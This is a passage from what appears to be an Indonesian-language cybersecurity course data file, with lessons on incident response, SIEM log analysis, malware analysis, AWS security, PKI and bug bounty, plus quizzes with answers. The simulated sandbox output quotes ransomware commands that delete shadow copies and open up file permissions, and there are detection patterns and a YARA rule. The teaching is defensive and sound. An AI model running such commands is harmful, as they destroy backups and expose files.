ACTION: Isolate immediately, preserve evidence, begin IR`,
        quiz: {
          q: 'Langkah PERTAMA yang harus dilakukan ketika ransomware terdeteksi di jaringan?',
          options: ['Reboot semua komputer', 'Bayar tebusan agar cepat selesai', 'Isolate sistem yang terinfeksi dari network', 'Format semua hardisk'],
          correct: 2,
          explanation: 'Containment adalah prioritas pertama — isolate sistem yang terinfeksi untuk mencegah penyebaran ke sistem lain. JANGAN reboot (evidence hilang) dan JANGAN bayar tebusan (tidak ada jaminan).',
        },
        challenge: {
          title: 'Build IR Playbook',
          desc: 'Buat IR Playbook untuk skenario "Compromised Admin Account" — akun admin ditemukan login dari negara asing di tengah malam. Tulis prosedur langkah demi langkah.',
          starter: `# === IR PLAYBOOK: Compromised Admin Account ===
# Version: 1.0
# Last Updated: 

TRIGGER: Deteksi login akun admin dari lokasi/waktu anomali

SEVERITY: P1 — Critical

ESCALATION:
- Immediate: SOC Lead
- Within 1 hour: CISO, IT Manager
- Within 4 hours: Legal team (jika data breach)

=== RESPONSE PROCEDURES ===

STEP 1: VERIFICATION (5 menit pertama)
Actions:
-
Evidence to collect:
-

STEP 2: CONTAINMENT (maks 15 menit)
Actions:
-
Do NOT:
-

STEP 3: INVESTIGATION (1-4 jam)
Check:
-
Tools to use:
-

STEP 4: ERADICATION
Actions:
-

STEP 5: RECOVERY
Actions:
-
Verification before restoring access:
-

STEP 6: POST-INCIDENT
-

COMMUNICATION TEMPLATE:
Subject: [CONFIDENTIAL] Security Incident - Compromised Account
To: [stakeholders]
Body: [template message untuk management]`,
          hint: 'Step 1: Verifikasi apakah admin benar-benar yang login. Step 2: Disable akun + kill session. Step 3: Audit semua yang dilakukan akun tersebut.',
        },
        xp: 75,
      },
      {
        id: 'l6t2', title: 'Log Analysis & SIEM', diff: 'intermediate',
        filename: 'log-analysis.sh',
        explain: `
<h3>Log Analysis & SIEM</h3>
<p>Log adalah rekaman semua aktivitas di sistem. Analisis log yang baik adalah inti dari deteksi ancaman.</p>
<h4>📝 Jenis Log Penting</h4>
<ul>
  <li><strong>Authentication logs</strong> — Siapa yang login, kapan, dari mana (/var/log/auth.log)</li>
  <li><strong>System logs</strong> — Aktivitas OS (/var/log/syslog)</li>
  <li><strong>Web server logs</strong> — Request HTTP (/var/log/apache2/access.log)</li>
  <li><strong>Firewall logs</strong> — Traffic yang diblokir/diizinkan</li>
  <li><strong>Application logs</strong> — Error dan event dari aplikasi</li>
  <li><strong>Windows Event Log</strong> — Security, System, Application events</li>
</ul>
<h4>🎯 SIEM — Security Information & Event Management</h4>
<p>SIEM mengumpulkan, mengkorelasikan, dan menganalisis log dari seluruh infrastruktur secara terpusat.</p>
<ul>
  <li><strong>Splunk</strong> — Platform SIEM enterprise terpopuler</li>
  <li><strong>ELK Stack</strong> — Elasticsearch, Logstash, Kibana (open source)</li>
  <li><strong>Wazuh</strong> — Open source SIEM + HIDS</li>
  <li><strong>IBM QRadar, Microsoft Sentinel</strong> — Enterprise cloud SIEM</li>
</ul>
<h4>⚠️ Deteksi dengan Log: Red Flags</h4>
<ul>
  <li>Banyak failed login dalam waktu singkat (brute force)</li>
  <li>Login sukses di luar jam kerja dari lokasi asing</li>
  <li>Akses ke file/direktori sensitif yang tidak biasa</li>
  <li>Banyak request 404 berurutan (directory scanning)</li>
  <li>Traffic keluar dalam jumlah besar (data exfiltration)</li>
</ul>
`,
        example: `# === Log Analysis dengan Command Line ===

# 1. Cek failed SSH login (brute force detection)
grep "Failed password" /var/log/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn | head -10

# Output: jumlah percobaan per IP
# 4821 192.168.1.100  ← Brute force!
# 12   10.0.0.5

# 2. Cari semua successful login
grep "Accepted password" /var/log/auth.log | \
  awk '{print $11, $9}' | sort | uniq -c

# 3. Web server log — cari SQL Injection attempts
grep -i "union\|select\|insert\|drop\|--" /var/log/apache2/access.log

# 4. Cari directory scanning (banyak 404)
awk '$9==404 {print $1}' /var/log/apache2/access.log | \
  sort | uniq -c | sort -rn | head -10

# 5. Data exfiltration (traffic keluar besar)
grep "$(date +%Y-%m-%d)" /var/log/firewall.log | \
  awk '{sum[$5]+=$NF} END {for(ip in sum) print sum[ip], ip}' | \
  sort -rn | head -10

# 6. Splunk SPL Query (detect brute force):
# index=auth_logs "Failed password"
# | stats count by src_ip
# | where count > 100
# | sort -count`,
        editorStarter: `#!/bin/bash
# === Log Analysis Challenge ===
# Kamu adalah SOC Analyst. Analisis log berikut dan
# identifikasi semua aktivitas mencurigakan

# LOG SAMPLE (simulasi):
cat > /tmp/sample_auth.log << 'EOF'
Jan 15 02:31:01 server sshd: Failed password for root from 45.33.32.156
Jan 15 02:31:02 server sshd: Failed password for root from 45.33.32.156
Jan 15 02:31:03 server sshd: Failed password for admin from 45.33.32.156
(... 500 baris serupa dalam 3 menit ...)
Jan 15 02:34:17 server sshd: Accepted password for deploy from 45.33.32.156
Jan 15 02:34:20 server sudo: deploy: /bin/bash root
Jan 15 03:12:44 server sshd: Accepted password for alice from 10.0.1.5
Jan 15 09:00:01 server sshd: Accepted password for bob from 192.168.1.20
EOF

# TASK 1: Hitung jumlah failed login per IP
echo "=== Failed Login Count ==="
# Command:

# TASK 2: Temukan IP yang berhasil login setelah banyak gagal
echo "=== Suspicious Successful Login ==="
# Command:

# TASK 3: Identifikasi privilege escalation
echo "=== Privilege Escalation Attempts ==="
# Command:

# TASK 4: Buat summary laporan
echo "=== THREAT SUMMARY ==="
echo "Brute Force IP: "
echo "Compromised Account: "
echo "Time of Compromise: "
echo "Attacker Actions: "
echo "Recommended Action: "`,
        editorTask: 'Tulis command untuk setiap analisis dan lengkapi threat summary berdasarkan log yang tersedia.',
        terminalSim: `[soc@analyst ~]$ # Splunk Search — Detecting Brute Force

index=auth_logs "Failed password"
| rex "from (?<src_ip>\d+\.\d+\.\d+\.\d+)"
| stats count by src_ip
| where count > 50
| sort -count
| table src_ip, count

Results:
src_ip           count
45.33.32.156     517   ← BRUTE FORCE!
185.220.101.5    89    ← Suspicious
92.118.160.5     67    ← Suspicious

[soc@analyst ~]$ # Check if brute force succeeded
index=auth_logs "Accepted password" src_ip=45.33.32.156

2024-01-15 02:34:17 Accepted password for deploy ← COMPROMISED!

[soc@analyst ~]$ # Create alert rule
alert create "SSH Brute Force" \
  --condition "failed_login_count > 50 in 5min" \
  --action "block_ip, notify_soc" \
  --severity "HIGH"

Alert created! Will trigger and block automatically.`,
        quiz: {
          q: 'Apa yang dimaksud dengan SIEM (Security Information and Event Management)?',
          options: ['Software antivirus terbaru', 'Sistem yang mengumpulkan dan menganalisis log dari seluruh infrastruktur secara terpusat', 'Firewall generasi terbaru', 'Tool untuk scanning vulnerability'],
          correct: 1,
          explanation: 'SIEM mengumpulkan log dari berbagai sumber (server, firewall, aplikasi), mengkorelasikannya, dan memberikan visibilitas terpusat untuk mendeteksi ancaman yang mungkin tidak terlihat jika log dilihat satu per satu.',
        },
        challenge: {
          title: 'Build SIEM Detection Rules',
          desc: 'Buat 3 detection rule untuk SIEM (dalam format pseudo-SPL/KQL) untuk mendeteksi: (1) Brute force, (2) Data exfiltration, (3) Lateral movement.',
          starter: `# === SIEM Detection Rules ===
# Format: SPL-like pseudo query

# RULE 1: SSH Brute Force Detection
# Trigger: >50 failed login dari satu IP dalam 5 menit
Rule Name: "Brute_Force_SSH"
Severity: HIGH
Query:
  index = ___
  filter = ___
  | stats ___ by ___
  | where ___ > ___
  | eval timespan = ___
Action: Block IP, Alert SOC

# RULE 2: Data Exfiltration Detection
# Trigger: Outbound >1GB dalam 1 jam dari satu host
Rule Name: "Data_Exfiltration"
Severity: CRITICAL
Query:

Action:

# RULE 3: Lateral Movement Detection
# Trigger: Satu user login ke >5 unique hosts dalam 10 menit
Rule Name: "Lateral_Movement"
Severity: HIGH
Query:

Action:

# TUNING NOTES:
# False positive yang mungkin untuk setiap rule:
Rule 1:
Rule 2:
Rule 3:`,
          hint: 'Pertimbangkan: apa threshold yang realistis? Apa sumber data (index) yang perlu di-query? Apa action otomatis yang aman?',
        },
        xp: 70,
      },
    ]
  },
  {
    id: 7, name: 'Malware Analysis', icon: '🦠', color: '#fb923c',
    topics: [
      {
        id: 'l7t1', title: 'Static & Dynamic Analysis', diff: 'advanced',
        filename: 'malware-analysis.md',
        explain: `
<h3>Malware Analysis</h3>
<p>Analisis malware membantu kita memahami cara kerja ancaman untuk membangun pertahanan yang lebih baik.</p>
<h4>🔍 Static Analysis (tanpa menjalankan malware)</h4>
<ul>
  <li><strong>File hashing</strong> — MD5/SHA256 untuk identifikasi dan VirusTotal lookup</li>
  <li><strong>String extraction</strong> — Temukan URL, IP, registry key, pesan dalam binary</li>
  <li><strong>PE header analysis</strong> — Import table, section headers, metadata</li>
  <li><strong>Disassembly</strong> — Ghidra, IDA Pro untuk baca assembly code</li>
  <li><strong>YARA rules</strong> — Pattern matching untuk identifikasi malware family</li>
</ul>
<h4>🏃 Dynamic Analysis (jalankan malware di sandbox)</h4>
<ul>
  <li><strong>Sandbox</strong> — ANY.RUN, Cuckoo, Joe Sandbox, VirusTotal Sandbox</li>
  <li><strong>Process monitoring</strong> — Process Monitor (ProcMon), Process Hacker</li>
  <li><strong>Network monitoring</strong> — Wireshark untuk C2 communication</li>
  <li><strong>Registry monitoring</strong> — Perubahan di registry untuk persistence</li>
  <li><strong>File system monitoring</strong> — File apa yang dibuat/dimodifikasi/dihapus</li>
</ul>
<h4>🔒 Lingkungan Analisis Aman</h4>
<ul>
  <li>SELALU gunakan isolated VM — snapshot sebelum analisis!</li>
  <li>Disable network atau gunakan fake internet (INetSim)</li>
  <li>Jangan transfer file dari VM analisis ke host!</li>
</ul>
<div class="ct-danger-box">⛔ <span>JANGAN PERNAH menjalankan malware di komputer asli atau jaringan produksi! Selalu gunakan isolated VM dengan network terputus atau fake C2 server.</span></div>
`,
        example: `# === Malware Analysis Workflow ===

# 1. STATIC ANALYSIS
# Hash identifikasi
md5sum suspicious.exe
sha256sum suspicious.exe
# → Submit ke VirusTotal: https://www.virustotal.com

# Extract strings
strings suspicious.exe | grep -E "http|https|\.com|\.ru|\.cn"
strings suspicious.exe | grep -iE "password|admin|credential"
strings suspicious.exe | grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"

# PE Header analysis (Linux: peutils, exiftool)
exiftool suspicious.exe
# PE sections yang mencurigakan:
# .upx0, .upx1 → file mungkin di-pack dengan UPX
# Entropy sangat tinggi → mungkin encrypted/obfuscated

# YARA rule sederhana
rule ransomware_generic {
  strings:
    $ransom_note = "Your files have been encrypted" nocase
    $btc_address = /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/
    $tor_url = /.onion/ nocase
  condition:
    2 of them
}

# 2. DYNAMIC ANALYSIS (dalam isolated VM)
# Jalankan sandbox
curl -F "file=@suspicious.exe" https://any.run/submit
# Monitor: network connections, registry changes, file drops

# ProcMon filter untuk monitoring:
# Process Name → contains → suspicious.exe`,
        editorStarter: `# === Malware Triage Report ===
# Tugas: Analisis sample malware yang ditemukan di sistem

SAMPLE INFORMATION:
File Name: update_installer.exe
File Size: 
SHA256 Hash: (gunakan sha256sum untuk hitung)
MD5 Hash: 
File Type: 

VIRUSTOTAL RESULTS:
Detection Rate: __ / 72 engines
Malware Family: 
First Seen: 
Tags: 

STATIC ANALYSIS:
Strings Found:
- URLs/IPs:
- Registry keys:
- File paths:
- Interesting keywords:

PE Header Analysis:
- Compiler:
- Packing detected: [ ] Ya [ ] Tidak
- Suspicious sections:
- Import functions of interest:

DYNAMIC ANALYSIS (Sandbox):
Network Connections:
- IP:Port:
- Domain:
- Protocol:

File System Changes:
- Files created:
- Files modified:

Registry Changes:
- Persistence mechanism:

CLASSIFICATION:
Malware Type: [ ] Ransomware [ ] Trojan [ ] Stealer [ ] Backdoor [ ] Other
Confidence: [ ] High [ ] Medium [ ] Low

INDICATORS OF COMPROMISE:
Hashes:
IPs:
Domains:
File paths:
Registry keys:

RECOMMENDED ACTIONS:
1.
2.`,
        editorTask: 'Isi malware triage report lengkap. Buat IoC yang bisa digunakan untuk hunting di SIEM.',
        terminalSim: `[analyst@malware-lab ~]$ strings suspicious.exe | grep -E "http|\.com"

http://185.220.xxx.xxx/gate.php
http://update-service-cdn.net/check
C:\\Users\\Public\\svchost32.exe
SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
YourFilesHaveBeenEncrypted
Send 0.05 BTC to: 1A2B3C...

[analyst@malware-lab ~]$ sha256sum suspicious.exe
a3f9b1c2... → VirusTotal: 54/72 MALICIOUS!
Family: Ryuk Ransomware

[analyst@malware-lab ~]$ # Running in Cuckoo Sandbox...

BEHAVIOR ANALYSIS:
Process Tree:
  update_installer.exe
  └─ cmd.exe /c "vssadmin delete shadows /all /quiet"  ← Deletes backups!
  └─ C:\Windows\svchost32.exe (dropped malware)
  └─ icacls . /grant Everyone:F /T /C /Q  ← Spreads to all files

Network:
  DNS: update-service-cdn.net → SINKHOLED (C2 blocked)
  TCP: 185.220.xxx.xxx:443 → BLOCKED by firewall

Registry:
  HKCU\Run\WindowsUpdate = svchost32.exe ← PERSISTENCE!

VERDICT: Ryuk Ransomware — CRITICAL THREAT
IoCs generated and pushed to SIEM.`,
        quiz: {
          q: 'Apa perbedaan antara static dan dynamic malware analysis?',
          options: ['Static lebih aman karena tidak menjalankan malware; dynamic menjalankannya di lingkungan terkontrol', 'Dynamic lebih lambat dari static', 'Static hanya untuk Linux, dynamic untuk Windows', 'Tidak ada perbedaan signifikan'],
          correct: 0,
          explanation: 'Static analysis memeriksa malware tanpa menjalankannya (aman dari perspektif infeksi). Dynamic analysis menjalankan malware di sandbox untuk mengamati perilaku nyatanya — lebih informatif tapi memerlukan isolasi yang ketat.',
        },
        challenge: {
          title: 'Write YARA Detection Rule',
          desc: 'Berdasarkan temuan analisis ransomware di atas, tulis YARA rule yang bisa mendeteksi malware serupa. Sertakan penjelasan setiap bagian rule.',
          starter: `// === YARA Detection Rule ===
// Target: Ryuk-like Ransomware
// Author: [Your Name]
// Date: 
// Version: 1.0

rule Ryuk_Ransomware_Generic {
  
  meta:
    description = ""
    author = ""
    severity = "critical"
    
  strings:
    // Ransom note indicators
    $ransom_msg = "" nocase
    
    // C2 communication
    $c2_pattern = "" nocase
    
    // Malicious behavior
    $vss_delete = "" nocase  // Deletes shadow copies
    $icacls_abuse = "" nocase
    
    // Dropped file path
    $drop_path = "" nocase
    
    // BTC address pattern
    $btc_regex = // regex pattern
    
  condition:
    // Trigger jika file PE dan ada X dari Y string
    uint16(0) == 0x5A4D  // PE magic bytes
    and (
      // Tulis kondisi yang tepat
    )
}

// PENJELASAN RULE:
// - String $ransom_msg mendeteksi:
// - Kondisi dipilih karena:
// - False positive yang mungkin:`,
          hint: 'uint16(0) == 0x5A4D cek PE header. Gunakan "2 of ($string*)" untuk match minimal 2 strings dari grup. Jangan terlalu spesifik (false negative) atau terlalu luas (false positive).',
        },
        xp: 80,
      },
    ]
  },
  {
    id: 8, name: 'Cloud Security', icon: '☁️', color: '#38bdf8',
    topics: [
      {
        id: 'l8t1', title: 'AWS Security Fundamentals', diff: 'advanced',
        filename: 'aws-security.md',
        explain: `
<h3>AWS Security Fundamentals</h3>
<p>Cloud telah mengubah cara kita mengelola infrastruktur — dan juga cara kita mengamankannya.</p>
<h4>🔐 Shared Responsibility Model</h4>
<p>AWS dan pelanggan berbagi tanggung jawab keamanan:</p>
<ul>
  <li><strong>AWS bertanggung jawab</strong> atas: security OF the cloud (hardware, jaringan fisik, hypervisor)</li>
  <li><strong>Kamu bertanggung jawab</strong> atas: security IN the cloud (OS, aplikasi, data, IAM)</li>
</ul>
<h4>👤 IAM — Identity & Access Management</h4>
<ul>
  <li><strong>Users</strong> — Individu dengan akses ke AWS</li>
  <li><strong>Groups</strong> — Kumpulan user dengan permission sama</li>
  <li><strong>Roles</strong> — Permission yang bisa diasumsikan oleh service/user</li>
  <li><strong>Policies</strong> — Dokumen JSON yang mendefinisikan permission</li>
</ul>
<h4>⚠️ AWS Security Misconfigurations Paling Umum</h4>
<ul>
  <li>S3 bucket terbuka untuk publik (data breach klasik!)</li>
  <li>IAM policy terlalu permisif (AdministratorAccess untuk semua)</li>
  <li>Security group 0.0.0.0/0 untuk semua port</li>
  <li>CloudTrail (logging) tidak aktif</li>
  <li>MFA tidak wajib untuk root account</li>
  <li>Access key di public repository (GitHub leakage)</li>
</ul>
<div class="ct-danger-box">⛔ <span>JANGAN PERNAH commit AWS access key ke Git! Dalam hitungan menit, bot otomatis akan menemukan dan menggunakannya untuk spin up ribuan instance — tagihannya bisa jutaan dolar!</span></div>
`,
        example: `# === AWS Security Best Practices ===

# 1. IAM — Least Privilege Policy
# ❌ BURUK: Policy terlalu permisif
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",           ← Semua action!
    "Resource": "*"          ← Semua resource!
  }]
}

# ✅ BAIK: Policy spesifik dan minimal
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": [
      "s3:GetObject",
      "s3:PutObject"
    ],
    "Resource": "arn:aws:s3:::my-specific-bucket/*"
  }]
}

# 2. S3 Bucket Security Check (AWS CLI)
# Cek public access settings
aws s3api get-bucket-acl --bucket my-bucket
aws s3api get-public-access-block --bucket my-bucket

# Blokir semua public access
aws s3api put-public-access-block --bucket my-bucket \
  --public-access-block-configuration \
  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# 3. Security Group Audit
aws ec2 describe-security-groups \
  --filters "Name=ip-permission.cidr,Values=0.0.0.0/0" \
  --query 'SecurityGroups[*].[GroupId,GroupName]'

# 4. CloudTrail (Logging)
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name mytrail`,
        editorStarter: `# === AWS Security Audit Checklist ===
# Gunakan AWS CLI untuk verifikasi setiap item

# ACCOUNT LEVEL
echo "=== ACCOUNT SECURITY ==="

# 1. Cek root MFA status
echo "[*] Root account MFA:"
# Command:

# 2. Cek apakah ada access key untuk root
echo "[*] Root access keys (should be none):"
# Command:

# 3. Cek password policy
echo "[*] IAM Password Policy:"
# Command:

# S3 SECURITY
echo ""
echo "=== S3 BUCKET AUDIT ==="

# 4. List semua bucket
echo "[*] All S3 buckets:"
# Command:

# 5. Cek setiap bucket untuk public access
echo "[*] Checking public access blocks:"
# Command (loop through buckets):

# IAM AUDIT
echo ""
echo "=== IAM AUDIT ==="

# 6. Cari user tanpa MFA
echo "[*] Users without MFA:"
# Command:

# 7. Cari access key yang tidak pernah digunakan >90 hari
echo "[*] Unused access keys (>90 days):"
# Command:

# EC2/NETWORK SECURITY
echo ""
echo "=== NETWORK SECURITY ==="

# 8. Security groups dengan 0.0.0.0/0
echo "[*] Security groups with open access:"
# Command:`,
        editorTask: 'Tulis AWS CLI command yang tepat untuk setiap bagian audit. Gunakan dokumentasi AWS CLI jika perlu.',
        terminalSim: `[analyst@seclab ~]$ aws s3 ls --profile audit-account

Found 12 S3 buckets. Checking public access...

bucket: company-logs-2023      → Private ✓
bucket: static-assets-prod     → Private ✓
bucket: backup-data-jan        → PUBLICLY ACCESSIBLE ⚠️
bucket: dev-testing-bucket     → PUBLICLY ACCESSIBLE ⚠️
bucket: user-uploads           → Private ✓

[analyst@seclab ~]$ aws s3 ls s3://backup-data-jan

database_dump_2023-12-01.sql.gz  ← EXPOSED DATABASE BACKUP!
employee_data_export.xlsx        ← EXPOSED EMPLOYEE DATA!
api_keys_backup.txt              ← EXPOSED API KEYS!

CRITICAL FINDINGS:
  S3://backup-data-jan: Publicly accessible!
  Contains: Database dumps, employee PII, API keys

IMMEDIATE ACTIONS:
1. Block public access NOW
2. Rotate all exposed API keys
3. Assess data breach scope
4. Notify DPO (Data Protection Officer)
5. Check access logs for unauthorized downloads`,
        quiz: {
          q: 'Dalam AWS Shared Responsibility Model, siapa yang bertanggung jawab atas keamanan OS yang berjalan di EC2?',
          options: ['AWS sepenuhnya', 'Customer (pengguna AWS)', 'Dibagi 50-50', 'Pihak ketiga yang dipilih'],
          correct: 1,
          explanation: 'AWS bertanggung jawab atas keamanan infrastruktur fisik (hypervisor, jaringan, hardware). Customer bertanggung jawab atas OS, aplikasi, data, konfigurasi, dan IAM — ini adalah "security IN the cloud".',
        },
        challenge: {
          title: 'Secure AWS Architecture',
          desc: 'Rancang arsitektur AWS yang aman untuk aplikasi web 3-tier (web, app, database). Tulis policy IAM minimal untuk setiap komponen dan security group rules.',
          starter: `# === Secure AWS Architecture Design ===

ARCHITECTURE:
Internet → [ALB] → [EC2 Web] → [EC2 App] → [RDS Database]

# IAM ROLES (least privilege):

# Role: WebServer-Role
# Purpose: Hanya bisa read dari S3 static assets
{
  "Version": "2012-10-17",
  "Statement": [
    // Tulis policy minimal untuk web server:
    
  ]
}

# Role: AppServer-Role  
# Purpose: Bisa akses Secrets Manager, kirim ke SQS
{
  "Version": "2012-10-17",
  "Statement": [
    // Tulis policy minimal untuk app server:
    
  ]
}

# SECURITY GROUPS:

# SG-ALB (Load Balancer)
Inbound:
- Port 80: from 0.0.0.0/0 (HTTP redirect)
- Port 443: from 0.0.0.0/0 (HTTPS)
Outbound:
- Port ___: to SG-Web only

# SG-Web (Web Server)
Inbound:
- Port ___: from ___ only
Outbound:
- Port ___: to SG-App only

# SG-App (App Server)
Inbound:
Outbound:

# SG-Database (RDS)
Inbound:
Outbound:

# ADDITIONAL SECURITY MEASURES:
1. Encryption at rest: 
2. Encryption in transit: 
3. Monitoring: 
4. Backup strategy: `,
          hint: 'Setiap tier hanya bisa komunikasi ke tier berikutnya. Database tidak boleh punya inbound dari internet sama sekali. Gunakan Secrets Manager untuk credentials.',
        },
        xp: 85,
      },
    ]
  },
  {
    id: 9, name: 'Cryptography', icon: '🔑', color: '#a78bfa',
    topics: [
      {
        id: 'l9t1', title: 'PKI & Sertifikat Digital', diff: 'advanced',
        filename: 'pki-certs.md',
        explain: `
<h3>PKI & Sertifikat Digital</h3>
<p>Public Key Infrastructure (PKI) adalah sistem yang memungkinkan komunikasi aman di internet.</p>
<h4>🔐 Bagaimana PKI Bekerja</h4>
<ol>
  <li>Server generate keypair: public key + private key</li>
  <li>Server meminta sertifikat ke Certificate Authority (CA)</li>
  <li>CA memverifikasi identitas server</li>
  <li>CA menandatangani sertifikat (digital signature)</li>
  <li>Browser memverifikasi tanda tangan CA yang dipercaya</li>
  <li>Koneksi terenkripsi terbentuk (TLS handshake)</li>
</ol>
<h4>🏛️ Hierarki CA</h4>
<ul>
  <li><strong>Root CA</strong> — Puncak hierarki kepercayaan, self-signed, offline</li>
  <li><strong>Intermediate CA</strong> — Di bawah Root CA, menerbitkan sertifikat akhir</li>
  <li><strong>End-Entity Certificate</strong> — Sertifikat untuk server/user/aplikasi</li>
</ul>
<h4>📋 Jenis Sertifikat</h4>
<ul>
  <li><strong>DV (Domain Validation)</strong> — Hanya verifikasi kepemilikan domain. Let's Encrypt.</li>
  <li><strong>OV (Organization Validation)</strong> — Verifikasi organisasi. Lebih terpercaya.</li>
  <li><strong>EV (Extended Validation)</strong> — Verifikasi paling ketat. Nama perusahaan di browser.</li>
  <li><strong>Wildcard</strong> — *.example.com (satu cert untuk semua subdomain)</li>
  <li><strong>Self-signed</strong> — Ditandatangani sendiri, tidak dipercaya browser</li>
</ul>
<div class="ct-tip-box">💡 <span>Let's Encrypt menyediakan sertifikat TLS gratis dan otomatis! Gunakan Certbot untuk setup otomatis dengan auto-renewal. Tidak ada alasan lagi pakai HTTP di 2024!</span></div>
`,
        example: `# === PKI & Certificate Operations ===

# 1. Generate RSA keypair
openssl genrsa -out server.key 2048

# 2. Create Certificate Signing Request (CSR)
openssl req -new -key server.key -out server.csr \
  -subj "/C=ID/ST=DKI Jakarta/L=Jakarta/O=PT Example/CN=example.com"

# 3. Self-sign (for testing only!)
openssl x509 -req -days 365 -in server.csr \
  -signkey server.key -out server.crt

# 4. View certificate details
openssl x509 -in server.crt -text -noout

# 5. Verify certificate chain
openssl verify -CAfile ca-bundle.crt server.crt

# 6. Check cert expiry (monitoring!)
openssl x509 -enddate -noout -in server.crt

# 7. Let's Encrypt with Certbot (production)
certbot --nginx -d example.com -d www.example.com
certbot renew --dry-run   # Test auto-renewal

# 8. Check remote certificate
echo | openssl s_client -connect example.com:443 2>/dev/null | \
  openssl x509 -noout -dates -subject -issuer

# 9. Certificate Transparency Log check
# https://crt.sh/?q=example.com  (find all certs issued for domain)`,
        editorStarter: `#!/bin/bash
# === PKI Lab: Build Your Own CA ===
# Buat mini Certificate Authority sendiri

# STEP 1: Create Root CA
echo "[1] Creating Root CA keypair..."
# Generate 4096-bit RSA key for Root CA (kuat!)
# Command:

echo "[2] Create Root CA self-signed certificate..."
# Self-sign Root CA cert (10 tahun validity)
# Command:

# STEP 2: Create Intermediate CA
echo "[3] Creating Intermediate CA..."
# Generate key untuk intermediate CA
# Command:

echo "[4] Create Intermediate CA CSR..."
# Buat CSR
# Command:

echo "[5] Sign Intermediate CA with Root CA..."
# Root CA menandatangani cert intermediate
# Command:

# STEP 3: Issue Server Certificate
echo "[6] Creating server keypair..."
# Generate server key
# Command:

echo "[7] Create server CSR..."
# Buat CSR dengan Subject Alt Names (SAN)
# Command:

echo "[8] Sign server cert with Intermediate CA..."
# Command:

# STEP 4: Verify Chain
echo "[9] Verifying certificate chain..."
# Gabungkan intermediate + root untuk chain file
# Command:

# Verify
# Command:

echo "=== Certificate chain created successfully! ==="`,
        editorTask: 'Lengkapi script untuk membangun CA hierarchy lengkap. Setiap langkah harus menggunakan openssl command yang tepat.',
        terminalSim: `[analyst@seclab ~]$ # Certificate Security Audit

[analyst@seclab ~]$ for domain in example.com api.example.com admin.example.com; do
  echo "=== $domain ==="
  echo | openssl s_client -connect $domain:443 2>/dev/null | openssl x509 -noout -dates -subject
done

=== example.com ===
notBefore=Jan  1 00:00:00 2024 GMT
notAfter=Apr  1 00:00:00 2024 GMT  ← Expires in 3 months!
subject=CN=example.com

=== api.example.com ===
notBefore=Jan  1 00:00:00 2023 GMT
notAfter=Jan  1 00:00:00 2024 GMT  ← ALREADY EXPIRED!
subject=CN=api.example.com

=== admin.example.com ===
notBefore=Nov  1 00:00:00 2023 GMT
notAfter=Nov  1 00:00:00 2025 GMT  ← OK ✓
subject=CN=admin.example.com

FINDINGS:
  api.example.com: EXPIRED CERT! Users seeing security warning!
  example.com: Expiring soon, renew within 30 days!

ACTIONS:
  1. Renew api.example.com immediately (CRITICAL)
  2. Schedule example.com renewal
  3. Setup auto-renewal with Certbot!`,
        quiz: {
          q: 'Apa yang terjadi jika sertifikat TLS sebuah website sudah expired?',
          options: ['Website tidak bisa diakses sama sekali', 'Browser menampilkan warning keamanan dan koneksi mungkin tetap tidak terenkripsi', 'Sertifikat langsung diperbarui otomatis', 'Tidak ada dampak apapun'],
          correct: 1,
          explanation: 'Browser akan menampilkan peringatan keamanan (certificate error). Pengguna bisa tetap melanjutkan (bypass), tapi tidak ada jaminan koneksi aman karena sertifikat yang expired tidak bisa diverifikasi dengan benar.',
        },
        challenge: {
          title: 'Certificate Monitoring System',
          desc: 'Buat script monitoring yang mengecek masa berlaku sertifikat TLS untuk daftar domain dan mengirim alert jika ada yang expires dalam 30 hari.',
          starter: `#!/bin/bash
# === SSL Certificate Monitor ===
# Script ini mengecek expiry cert dan alert jika hampir expired

DOMAINS=(
  "example.com"
  "api.example.com"
  "admin.example.com"
)

ALERT_DAYS=30    # Alert jika expires dalam X hari
EMAIL="security@company.com"

check_cert_expiry() {
  local domain=$1
  
  # TODO: Dapatkan expiry date dari cert
  EXPIRY=$(echo | openssl s_client -connect ${domain}:443 2>/dev/null | \
           # Command untuk extract expiry date)
  
  # TODO: Hitung sisa hari
  DAYS_LEFT=$(# Hitung selisih antara expiry date dan hari ini)
  
  echo "Domain: $domain | Expires: $EXPIRY | Days left: $DAYS_LEFT"
  
  # TODO: Alert jika kurang dari ALERT_DAYS
  if [ $DAYS_LEFT -le $ALERT_DAYS ]; then
    echo "⚠️  ALERT: $domain expires in $DAYS_LEFT days!"
    # TODO: Kirim email alert
  fi
  
  # TODO: Critical alert jika sudah expired
  if [ $DAYS_LEFT -le 0 ]; then
    echo "🚨 CRITICAL: $domain ALREADY EXPIRED!"
    # TODO: Kirim critical alert
  fi
}

echo "=== SSL Certificate Monitoring ==="
echo "Date: $(date)"
echo ""

for domain in "${DOMAINS[@]}"; do
  check_cert_expiry "$domain"
done`,
          hint: 'Gunakan "openssl x509 -enddate -noout" untuk dapat tanggal. "date -d" untuk konversi ke seconds. Modulo selisih dengan 86400 untuk days.',
        },
        xp: 80,
      },
    ]
  },
  {
    id: 10, name: 'Bug Bounty & Pro', icon: '🏆', color: '#fbbf24',
    topics: [
      {
        id: 'l10t1', title: 'Bug Bounty Program', diff: 'expert',
        filename: 'bug-bounty.md',
        explain: `
<h3>Bug Bounty — Jadi Ethical Hacker Profesional</h3>
<p>Bug Bounty adalah program di mana perusahaan membayar peneliti keamanan yang menemukan dan melaporkan kerentanan di sistem mereka.</p>
<h4>💰 Platform Bug Bounty</h4>
<ul>
  <li><strong>HackerOne</strong> — Platform terbesar, home to Google, Microsoft, Uber, dll</li>
  <li><strong>Bugcrowd</strong> — Competitor utama HackerOne</li>
  <li><strong>Intigriti</strong> — Platform Eropa yang berkembang pesat</li>
  <li><strong>Synack</strong> — Private, invite-only, bayaran lebih tinggi</li>
  <li><strong>Yeswehack</strong> — European platform</li>
  <li><strong>Program Private</strong> — Langsung dengan perusahaan (Apple, Tesla, dll)</li>
</ul>
<h4>📊 Reward Tiers Umum</h4>
<ul>
  <li>🟡 Low: $100-500 (informational, low impact)</li>
